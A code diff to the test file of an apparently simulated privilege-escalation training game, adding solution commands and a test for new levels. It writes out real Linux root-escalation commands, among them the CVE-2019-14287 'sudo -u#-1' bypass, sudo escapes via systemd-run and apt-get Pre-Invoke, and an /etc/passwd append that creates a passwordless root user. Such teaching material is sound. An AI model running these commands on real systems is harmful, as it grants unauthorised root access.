@@ -95,6 +95,9 @@ const SOLUTIONS = {
         "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"",
         'su pwnd'
     ],
+    28: ['sudo -u#-1 /bin/bash'],
+    29: ['sudo systemd-run /bin/sh'],
+    30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
 };
 
 let pass = 0, fail = 0;
@@ -126,6 +129,19 @@ const authOk = first.some(l => l.text.startsWith('[sudo] password for'))
     && !second.some(l => l.text.startsWith('[sudo] password for'));
 console.log(`${authOk ? 'PASS' : 'FAIL'}  sudo -l password prompt (once per machine)`);
 authOk ? pass++ : fail++;
+
+// box-28: (ALL, !root) exclusion must block the literal name and uid 0, but
+// still fall for the CVE-2019-14287 negative-uid / uint32-wraparound bypass.
+loadLevel(LEVELS[27]); // box-28
+const blockedName = sandbox.CMD.execute('sudo -u root /bin/bash');
+const blockedZero = sandbox.CMD.execute('sudo -u#0 /bin/bash');
+const nameOk = blockedName.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
+const zeroOk = blockedZero.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
+sandbox.CMD.execute('sudo -u#-1 /bin/bash');
+const bypassOk = sandbox.SESSION.isRoot === true;
+const negUidOk = nameOk && zeroOk && bypassOk;
+console.log(`${negUidOk ? 'PASS' : 'FAIL'}  sudo negative-uid bypass (box-28: -u root and -u#0 blocked, -u#-1 roots)`);
+negUidOk ? pass++ : fail++;
 
 // Blue-team: for boxes that declare a fix, root then harden and confirm it closes.
 console.log('');
